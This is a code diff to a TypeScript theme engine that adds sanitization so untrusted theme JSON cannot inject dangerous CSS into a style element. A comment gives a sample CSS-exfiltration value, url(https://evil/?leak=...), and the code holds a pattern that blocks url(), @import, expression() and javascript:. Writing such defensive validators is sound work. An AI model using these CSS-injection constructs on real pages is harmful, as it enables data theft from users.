@@ -14,6 +14,124 @@ import type {
 
 const log = createLogger('theme-engine');
 
+// --- CSS sanitization ---
+//
+// Theme JSON (tokens, css, component properties) can originate from an
+// untrusted source: a local `import theme` paste, or — for `applyCherryTheme`
+// — the host page of a cherry embed. Both paths funnel into a `<style>`
+// element, so a permissive value would let the author beacon data out via
+// `url(https://evil/?leak=...)` / `@import` (classic CSS-exfiltration), or
+// smuggle `expression()`/`javascript:` in legacy engines. Every value is
+// validated against a narrow allowlist before it reaches the stylesheet;
+// anything that doesn't match is dropped rather than partially escaped, since
+// partial escaping of CSS is easy to get wrong.
+
+/** Matches the dangerous constructs we reject outright, case-insensitively. */
+const UNSAFE_CSS_PATTERN = /url\s*\(|@import|expression\s*\(|javascript:|[<>]/i;
+
+/**
+ * A single CSS value (custom property value, or one declaration's RHS).
+ * Allows: hex colors, plain numbers + common units, a small keyword
+ * character set, and calls to the specific CSS functions in
+ * `SAFE_CSS_FUNCTION_NAMES` — the vocabulary `deriveTokens` and typical theme
+ * JSON actually produce. Rejects anything containing `url(`, `@import`,
+ * `expression(`, `javascript:`, angle brackets, or a call to any function not
+ * on the allowlist.
+ */
+const SAFE_CSS_VALUE = /^[a-zA-Z0-9#%.,()\-\s]*$/;
+const CSS_FUNCTION_CALL = /([a-zA-Z-]+)\s*\(/g;
+const SAFE_CSS_FUNCTION_NAMES = new Set([
+  'rgb',
+  'rgba',
+  'hsl',
+  'hsla',
+  'hwb',
+  'var',
+  'calc',
+  'clamp',
+  'min',
+  'max',
+]);
+
+/** True when `value` is a plain, safe CSS value with no escape-hatch constructs. */
+function isSafeCssValue(value: string): boolean {
+  if (typeof value !== 'string' || value.length === 0 || value.length > 200) return false;
+  if (UNSAFE_CSS_PATTERN.test(value)) return false;
+  if (!SAFE_CSS_VALUE.test(value)) return false;
+  for (const match of value.matchAll(CSS_FUNCTION_CALL)) {
+    if (!SAFE_CSS_FUNCTION_NAMES.has(match[1].toLowerCase())) return false;
+  }
+  return true;
+}
+
+/** Sanitize a token map: drop any entry whose value fails `isSafeCssValue`. */
+function sanitizeTokens(tokens: Record<string, string>): Record<string, string> {
+  const safe: Record<string, string> = {};
+  for (const [key, value] of Object.entries(tokens)) {
+    if (isSafeCssValue(value)) safe[key] = value;
+    else log.warn('dropping unsafe theme token value', { key });
+  }
+  return safe;
+}
+
+/**
+ * `fontFamily` is the one component property that isn't a plain CSS value —
+ * it's a comma-separated list of family names. Allow letters, digits, spaces,
+ * hyphens, commas, and quotes; nothing else (blocks `url(...)` local()
+ * references and any other function call).
+ */
+const SAFE_FONT_FAMILY = /^[a-zA-Z0-9\s,'"-]{1,200}$/;
+
+/** Sanitize one `ThemeComponent`: drop any property with an unsafe value. */
+function sanitizeComponent(component: ThemeComponent): ThemeComponent {
+  const safe: ThemeComponent = {};
+  for (const [key, value] of Object.entries(component) as [keyof ThemeComponent, string][]) {
+    const ok = key === 'fontFamily' ? SAFE_FONT_FAMILY.test(value) : isSafeCssValue(value);
+    if (ok) safe[key] = value;
+    else log.warn('dropping unsafe theme component property', { key });
+  }
+  return safe;
+}
+
+/** Sanitize a full `ThemeComponents` map, component by component. */
+function sanitizeComponents(components: ThemeComponents): ThemeComponents {
+  const safe: ThemeComponents = {};
+  for (const [key, comp] of Object.entries(components) as [
+    keyof ThemeComponents,
+    ThemeComponent,
+  ][]) {
+    if (comp) safe[key] = sanitizeComponent(comp);
+  }
+  return safe;
+}
+
+/**
+ * Raw `theme.css` is free-form CSS text, not a single value — `isSafeCssValue`
+ * (which forbids `{`/`}`/`;`) doesn't apply. Instead reject the whole block if
+ * it contains any of the same dangerous constructs anywhere in the text; there
+ * is no safe partial-escape of arbitrary CSS.
+ */
+function sanitizeCustomCss(css: string | undefined): string | undefined {
+  if (!css) return undefined;
+  if (UNSAFE_CSS_PATTERN.test(css)) {
+    log.warn(
+      'dropping theme.css — contains url()/@import/expression()/javascript: or angle brackets'
+    );
+    return undefined;
+  }
+  return css;
+}
+
+/** Sanitize a full theme in place (returns a new object; input is untouched). */
+function sanitizeTheme(theme: SliccTheme): SliccTheme {
+  return {
+    ...theme,
+    tokens: sanitizeTokens(theme.tokens),
+    css: sanitizeCustomCss(theme.css),
+    components: theme.components ? sanitizeComponents(theme.components) : undefined,
+  };
+}
+
 /** Convert hex (#rrggbb) to [h, s, l] where h is 0-360, s and l are 0-1. */
 export function hexToHsl(hex: string): [number, number, number] {
   const r = parseInt(hex.slice(1, 3), 16) / 255;
@@ -267,16 +385,21 @@ function generateComponentCss(components: ThemeComponents): string {
  * custom CSS the theme supplies. Shared by `applyThemeOverrides` (local themes)
  * and `applyCherryTheme` (host-supplied themes via the cherry SDK) so the two
  * paths can't drift.
+ *
+ * Sanitizes the theme first (see `sanitizeTheme`) — both callers accept
+ * externally-authored JSON, so this is the single chokepoint that guarantees
+ * no unsafe value reaches the `<style>` element regardless of entry point.
  */
 function buildThemeCss(theme: SliccTheme): string {
-  const declarations = Object.entries(theme.tokens)
+  const safe = sanitizeTheme(theme);
+  const declarations = Object.entries(safe.tokens)
     .map(([k, v]) => `  ${k}: ${v};`)
     .join('\n');
-  const shaderRule = theme.disableShader
-    ? `\n.wcui-shader{display:none!important;}\nbody{background:${theme.tokens['--canvas'] || theme.tokens['--s2-gray-25'] || 'var(--canvas)'}!important;}`
+  const shaderRule = safe.disableShader
+    ? `\n.wcui-shader{display:none!important;}\nbody{background:${safe.tokens['--canvas'] || safe.tokens['--s2-gray-25'] || 'var(--canvas)'}!important;}`
     : '';
-  const componentCss = theme.components ? `\n${generateComponentCss(theme.components)}` : '';
-  const customCss = theme.css ? `\n${theme.css}` : '';
+  const componentCss = safe.components ? `\n${generateComponentCss(safe.components)}` : '';
+  const customCss = safe.css ? `\n${safe.css}` : '';
   return `:root {\n${declarations}\n}\n.dark, [data-theme="dark"] {\n${declarations}\n}${shaderRule}${componentCss}${customCss}`;
 }
 
